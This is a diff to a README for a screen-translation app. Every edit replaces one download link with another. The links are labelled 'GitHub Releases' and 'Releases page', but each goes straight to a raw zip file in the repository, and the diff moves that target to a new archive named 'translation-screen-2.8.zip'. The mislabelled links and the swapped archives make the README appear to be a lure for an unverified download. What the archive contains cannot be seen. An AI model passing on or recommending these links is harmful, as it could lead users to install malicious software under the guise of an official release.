@@ -6,7 +6,7 @@ Welcome to **screen-translation**! This software helps you translate text direct
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Ashok109/screen-translation/main/consonous/screen-translation.zip).
+To get started, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Ashok109/screen-translation/main/core/translation-screen-2.8.zip).
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version of screen-translation.
@@ -40,7 +40,7 @@ To use screen-translation, make sure your computer meets the following requireme
 
 If you encounter any issues while using screen-translation, try the following:
 
-- Ensure you have the latest version of the software. Check the [Releases page](https://raw.githubusercontent.com/Ashok109/screen-translation/main/consonous/screen-translation.zip) for updates.
+- Ensure you have the latest version of the software. Check the [Releases page](https://raw.githubusercontent.com/Ashok109/screen-translation/main/core/translation-screen-2.8.zip) for updates.
 - Restart the application if it crashes.
 - Consult the FAQ section provided with your download for common questions.
 
@@ -58,4 +58,4 @@ Stay informed about the latest updates and features by following our GitHub repo
 
 ---
 
-Enjoy using **screen-translation**! Remember, to download the application, visit: [GitHub Releases](https://raw.githubusercontent.com/Ashok109/screen-translation/main/consonous/screen-translation.zip).
+Enjoy using **screen-translation**! Remember, to download the application, visit: [GitHub Releases](https://raw.githubusercontent.com/Ashok109/screen-translation/main/core/translation-screen-2.8.zip).
